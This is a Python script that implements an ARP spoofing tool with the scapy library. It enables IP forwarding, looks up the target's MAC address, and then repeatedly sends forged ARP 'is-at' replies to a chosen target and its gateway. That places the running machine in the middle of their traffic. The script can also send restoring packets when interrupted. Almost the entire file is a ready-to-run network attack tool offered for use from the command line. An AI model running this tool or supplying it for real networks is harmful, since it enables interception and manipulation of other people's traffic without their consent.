import platform
import re
import sys
import time

import colorama
from colorama import Fore
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, send


class ARPSpoofer:
    def __init__(self, gateway, ip_address):
        self.gateway = gateway
        self.ip_address = ip_address
        self.is_interrupted = False

    def is_valid(self):
        reg = \
            r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
        return re.match(reg, self.gateway) and re.match(reg, self.ip_address)

    @staticmethod
    def set_forwarding(value):
        match platform.system():
            case "Linux" | "Darwin":
                with open("/proc/sys/net/ipv4/ip_forward", "r+") as file:
                    return file.write(value)

    @staticmethod
    def get_mac(ip_address):
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
        answer, _ = srp(packet, timeout=5, verbose=False)
        if len(answer) > 0:
            return answer[0][1].hwsrc
        return None

    def spoof(self):
        target_mac = self.get_mac(self.ip_address)
        if not target_mac:
            log_and_exit(f"{Fore.RED}[!] Unable to get MAC Address..")
        # Starting forwarding
        self.set_forwarding("1")
        while True:
            try:
                # Start spoofing process
                time.sleep(1)
                if not self.is_interrupted:
                    send(ARP(pdst=self.ip_address, hwdst=target_mac, psrc=self.gateway, op="is-at"), verbose=0)
                    send(ARP(pdst=self.gateway, hwdst=target_mac, psrc=self.ip_address, op="is-at"), verbose=0)
                    print(f"{Fore.YELLOW}[+] (ARP) Spoofing {self.ip_address}... [-] MAC Address: {target_mac}")
            except KeyboardInterrupt:
                self.is_interrupted = True
                self.unspoof()

    def unspoof(self):
        # Restore network if there are problems
        arp = ARP(pdst=self.ip_address, hwdst=self.get_mac(self.ip_address), psrc=self.gateway, hwsrc=self.get_mac(self.gateway))
        sec = 0
        while True:
            try:
                send(arp, verbose=1)
                sec = sec + 1
                if sec == 5:  # Send packets for X seconds
                    self.set_forwarding("0")
                    log_and_exit(f"\n{Fore.LIGHTGREEN_EX}[*] Network Restored!\n")
                time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{Fore.LIGHTCYAN_EX}[-] You are already restoring the network!")


def log_and_exit(text):
    print(text)
    sys.exit(1)


if __name__ == "__main__":
    colorama.init(autoreset=True)
    syntax_error = f"{Fore.RED}[*] Usage: \"python3 {sys.argv[0]} -g <gateway_ip> -i <ip_address>\""
    # Checking for args
    if (len(sys.argv) != 5) or not (sys.argv[1] == "-g" and sys.argv[3] == "-i"):
        log_and_exit(syntax_error)
    # Valid args
    instance = ARPSpoofer(sys.argv[2], sys.argv[4])
    if instance.is_valid():
        instance.spoof()
    else:
        print(Fore.RED + f"{Fore.RED}[!] Invalid IP. Please try again!")
